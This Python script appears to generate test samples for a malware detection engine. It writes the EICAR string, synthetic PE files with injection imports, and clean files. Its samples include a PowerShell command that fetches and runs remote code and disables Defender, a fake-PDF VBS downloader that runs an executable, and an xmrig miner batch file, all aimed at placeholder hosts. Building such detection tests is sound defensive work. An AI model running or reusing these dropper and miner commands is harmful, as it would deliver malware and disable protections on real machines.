#!/usr/bin/env python3
"""Creates harmless test samples for the detection engine (NOT packaged with the app).
Synthetic PEs are structurally valid headers + random data; they never execute anything useful."""
import os, struct, random, zipfile, sys, base64

out = sys.argv[1] if len(sys.argv) > 1 else 'samples'
os.makedirs(out, exist_ok=True)
random.seed(2026)

EICAR = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

def align(x, a): return (x + a - 1) // a * a

def build_pe(sections, imports, entry_sec, entry_off=0x10):
    """sections: list of (name, data(bytes or None for uninit), vsize, chars). imports: {dll:[fn]}"""
    FA, SA = 0x200, 0x1000
    nsec = len(sections) + 1
    hdr_size = 0x400
    va = 0x1000; raw = hdr_size
    secs = []
    for name, data, vsize, chars in sections:
        rs = align(len(data), FA) if data else 0
        secs.append(dict(name=name, data=data or b'', va=va, vsize=vsize, raw=raw if rs else 0, rs=rs, chars=chars))
        va += align(max(vsize, rs), SA); raw += rs
    # import section
    iva = va; dlls = list(imports.items())
    desc_size = 20 * (len(dlls) + 1)
    body = bytearray(desc_size); thunks = []
    pos = desc_size
    blobs = bytearray()
    names_off = {}
    # layout: descriptors | ILTs | IATs | names
    ilt_offs = []; cur = desc_size
    for dll, fns in dlls:
        ilt_offs.append(cur); cur += 4 * (len(fns) + 1)
    iat_offs = []
    for dll, fns in dlls:
        iat_offs.append(cur); cur += 4 * (len(fns) + 1)
    data = bytearray(cur)
    strtab = bytearray()
    def addstr(b):
        off = cur + len(strtab); strtab.extend(b);
        return off
    for i, (dll, fns) in enumerate(dlls):
        name_rva = iva + addstr(dll.encode() + b'\0')
        if len(strtab) % 2: strtab.extend(b'\0')
        for j, fn in enumerate(fns):
            hint_rva = iva + addstr(b'\0\0' + fn.encode() + b'\0')
            if len(strtab) % 2: strtab.extend(b'\0')
            struct.pack_into('<I', data, ilt_offs[i] + 4 * j, hint_rva)
            struct.pack_into('<I', data, iat_offs[i] + 4 * j, hint_rva)
        struct.pack_into('<IIIII', data, 20 * i, iva + ilt_offs[i], 0, 0, name_rva, iva + iat_offs[i])
    idata = bytes(data + strtab)
    irs = align(len(idata), FA)
    secs.append(dict(name='.idata', data=idata, va=iva, vsize=len(idata), raw=raw, rs=irs, chars=0xC0000040))
    size_image = align(iva + max(len(idata), 1), SA)
    es = secs[entry_sec]
    f = bytearray(hdr_size)
    f[0:2] = b'MZ'; struct.pack_into('<I', f, 0x3c, 0x40)
    f[0x40:0x44] = b'PE\0\0'
    struct.pack_into('<HHIIIHH', f, 0x44, 0x14c, nsec, 0x5f5e1000, 0, 0, 224, 0x0102)
    o = 0x58
    struct.pack_into('<HBBIIIIIII', f, o, 0x10b, 14, 0, 0x1000, 0x1000, 0, es['va'] + entry_off, 0x1000, 0x2000, 0x400000)
    struct.pack_into('<IIHHHHHHIIIIHH', f, o + 32, SA, FA, 6, 0, 0, 0, 6, 0, 0, size_image, hdr_size, 0, 2, 0x8140)
    struct.pack_into('<IIIIII', f, o + 72, 0x100000, 0x1000, 0x100000, 0x1000, 0, 16)
    struct.pack_into('<II', f, o + 96 + 8, iva, len(idata))
    so = o + 224
    for i, s in enumerate(secs):
        struct.pack_into('<8sIIIIIIHHI', f, so + 40 * i, s['name'].encode()[:8], s['vsize'], s['va'], s['rs'], s['raw'], 0, 0, 0, 0, s['chars'])
    for s in secs:
        if s['rs']:
            f.extend(s['data'] + b'\0' * (s['rs'] - len(s['data'])))
    return bytes(f)

rnd = lambda n: bytes(random.getrandbits(8) for _ in range(n))
code_like = lambda n: bytes((0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0x33, 0xC0, 0x5D, 0xC3, 0x90, 0x90)[i % 12] for i in range(n))

# 1) EICAR
open(f'{out}/eicar.com', 'wb').write(EICAR)
with zipfile.ZipFile(f'{out}/eicar_arsiv.zip', 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('belgeler/eicar.com', EICAR)
    z.writestr('benioku.txt', 'Test arsivi')

# 2) Malicious synthetic injector (UPX-like packed + injection imports)
pe = build_pe([('UPX0', None, 0x10000, 0xE0000080), ('UPX1', rnd(0x3000), 0x3000, 0xE0000040)],
              {'KERNEL32.dll': ['LoadLibraryA', 'GetProcAddress', 'VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread', 'OpenProcess']},
              entry_sec=1)
open(f'{out}/oyun_hilesi_injector.exe', 'wb').write(pe)

# 3) Suspicious synthetic (high entropy code, very few imports, no version info) -> Suspicious
pe2 = build_pe([('.text', rnd(0x4000), 0x4000, 0x60000020), ('.data', code_like(0x400), 0x400, 0xC0000040)],
               {'KERNEL32.dll': ['LoadLibraryA', 'GetProcAddress', 'ExitProcess']}, entry_sec=0)
open(f'{out}/kurulum_yardimcisi.exe', 'wb').write(pe2)

# 4) Clean synthetic PE (normal code + normal imports)
pe3 = build_pe([('.text', code_like(0x2000), 0x2000, 0x60000020), ('.rdata', b'Hello world\0' * 64, 0x300, 0x40000040)],
               {'KERNEL32.dll': ['GetModuleHandleA', 'ExitProcess', 'GetCommandLineA', 'GetStartupInfoA', 'HeapAlloc', 'HeapFree', 'GetLastError'],
                'USER32.dll': ['MessageBoxA', 'CreateWindowExA', 'DefWindowProcA']}, entry_sec=0)
open(f'{out}/temiz_uygulama.exe', 'wb').write(pe3)

# 5) PowerShell dropper with encoded command
inner = "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/payload.ps1'); Set-MpPreference -DisableRealtimeMonitoring $true"
enc = base64.b64encode(inner.encode('utf-16le')).decode()
open(f'{out}/fatura_odeme.ps1', 'w').write(f"$a = 'x'\npowershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {enc}\n")

# 6) Double-extension script disguised as PDF
open(f'{out}/fatura.pdf.vbs', 'w').write('Set o = CreateObject("MSXML2.XMLHTTP")\nSet s = CreateObject("ADODB.Stream")\no.Open "GET", "http://example.invalid/a.exe", False\no.Send\ns.Open\ns.Type = 1\ns.Write o.responseBody\ns.SaveToFile "a.exe", 2\nCreateObject("WScript.Shell").Run "a.exe"\n')

# 7) Miner batch
open(f'{out}/sistem_guncelle.bat', 'w').write('@echo off\nstart /min xmrig.exe -o stratum+tcp://pool.example.invalid:3333 -u 4' + 'A'*94 + ' --donate-level 1 --background\n')

# 8) Clean files
open(f'{out}/notlar.txt', 'w').write('Alışveriş listesi: süt, ekmek, peynir.\nToplantı saat 14:00.\n')
open(f'{out}/script_temiz.ps1', 'w').write('Get-ChildItem -Path $env:USERPROFILE\\Documents | Sort-Object Length | Select-Object -First 5\n')
with zipfile.ZipFile(f'{out}/fotograflar.zip', 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('a.txt', 'tatil notlari'); z.writestr('b.csv', 'x,y\n1,2\n')
print('samples written to', out)
